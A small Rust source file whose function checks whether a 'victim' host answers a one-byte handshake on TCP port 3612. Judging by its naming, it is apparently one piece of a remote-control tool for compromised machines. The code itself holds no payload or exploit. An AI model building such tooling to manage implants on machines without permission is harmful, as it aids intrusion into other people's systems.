use std::{net::TcpStream, io::{Write, BufReader, Read}};

use crate::Victim;

pub fn is_victim_listening(victim: &Victim) -> bool {

    let mut stream = match TcpStream::connect(victim.ip.ip().to_string() + ":3612") {
        Ok(stream) => stream,
        Err(_) => {
            error!("Failed to connect to {}'s server", victim.ip);
            return false;
        }
    };

    if let Err(_) = stream.write_all(&[1]) {
        return false;
    }
    let mut buf_reader = BufReader::new(&stream);
    let mut buffer: [u8; 1] = [0];
    if let Err(err) = buf_reader.read_exact(&mut buffer) {
        error!("Failed to read from {}'s server: {}", victim.ip, err);
        return false;
    }
    if buffer != [9] {
        error!("{}'s server didn't send 9 back", victim.ip);
        return false;
    }
    true
}
